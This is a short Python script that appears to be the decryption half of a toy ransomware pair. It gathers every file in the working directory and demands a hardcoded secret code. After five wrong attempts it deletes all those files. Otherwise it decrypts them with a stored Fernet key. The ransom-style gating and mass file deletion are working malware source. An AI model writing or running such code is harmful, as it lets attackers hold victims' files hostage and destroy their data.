#!usr/bin/env python3
import os
from cryptography.fernet import Fernet, InvalidToken

# Find all files in the directory
files = []
for file in os.listdir():
    if file == "Encryption.py" or file == "thekey.key" or file == "Decryption.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# Secret code to be entered by the user
correct_code = "707"

# Number of attempts allowed
attempts_left = 5

while attempts_left > 0:
    user_code = input("Enter the secret code: ")
    if user_code == correct_code:
        break
    else:
        attempts_left -= 1
        print(f"Incorrect code. {attempts_left} attempts left.")

# Check if the user has entered the correct code
if attempts_left == 0:
    print("Too many incorrect attempts. Deleting encrypted files...")
    for file_name in files:
        os.remove(file_name)
    print("Encrypted files deleted. Exiting program.")
    exit()

# Read the Fernet key
with open("thekey.key", "rb") as key_file:
    secret_key = key_file.read()

# Decrypt each file
for file_name in files:
    with open(file_name, "rb") as encrypted_file:
        encrypted_content = encrypted_file.read()

    try:
        decrypted_content = Fernet(secret_key).decrypt(encrypted_content)
        decrypted_file_name = "decrypted_" + file_name
        with open(decrypted_file_name, "wb") as decrypted_file:
            decrypted_file.write(decrypted_content)
        print(f"Decryption successful for {file_name}.")
    except InvalidToken:
        print(f"Invalid token encountered while decrypting {file_name}. Skipping...")
